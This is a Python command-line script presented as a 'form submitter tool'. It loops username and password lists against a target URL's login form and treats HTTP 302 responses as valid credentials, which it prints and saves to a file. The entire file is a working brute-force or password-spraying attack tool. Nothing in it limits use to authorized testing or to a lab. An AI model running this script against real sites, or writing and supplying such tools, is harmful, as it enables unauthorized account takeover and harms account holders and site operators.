import argparse
import os
import time
import requests


def submitter(url, usernames: list, passwords: list, delay=0):
    found = []
    session = requests.Session()

    for password in passwords:
        for username in usernames:
            payload = {"username": username, "password": password}

            try:
                res = session.post(url, data=payload, timeout=10)
            except requests.RequestException as e:
                print(f"Request error for {username}: {e}")
                continue

            if res.status_code == 302:
                found.append((username, password))

            if delay:
                time.sleep(delay)

    return found


def main():
    print('=' * 36)
    print('|' + ' ' * 34 + '|')
    print('|' + ' FORM SUBMITTER TOOL '.center(34) + '|')
    print('|' + ' ' * 34 + '|')
    print('=' * 36)

    try:
        parser = argparse.ArgumentParser(description="form submitter tool")
        parser.add_argument('-t', '--target', nargs='?', help="Target URL", required=True)
        parser.add_argument('-p', '--password', help="Path to passwords file or a single password")
        parser.add_argument('-u', '--username', help="Path to usernames file or a single username")
        parser.add_argument('-d', '--delay', type=float, default=0, help="Delay between requests in seconds (default: 0)")
        parser.add_argument('-o', '--output', help="Output file to save found credentials")

        args = parser.parse_args()

        if args.username:
            if os.path.isfile(args.username):
                with open(args.username, 'r') as f:
                    usernames = [username.strip() for username in f.readlines() if username.strip()]
            else:
                usernames = [args.username]
        else:
            usernames = []

        if args.password:
            if os.path.isfile(args.password):
                with open(args.password, 'r') as f:
                    passwords = [password.strip() for password in f.readlines() if password.strip()]
            else:
                passwords = [args.password]
        else:
            passwords = []

        res = submitter(args.target, usernames, passwords, delay=args.delay)
        
        for username, password in res:
            print(f"Found valid credentials: {username}:{password}")

        if args.output:
            with open(args.output, 'w') as f:
                for username, password in res:
                    f.write(f"{username}:{password}\n")
            print(f"Results saved to {args.output}")

    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user.")
        return
    except FileNotFoundError as e:
        print(f"[ERROR] File not found: {e}")
        return
    except IOError as e:
        print(f"[ERROR] I/O error: {e}")
        return
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        return


if __name__ == "__main__":
    main()

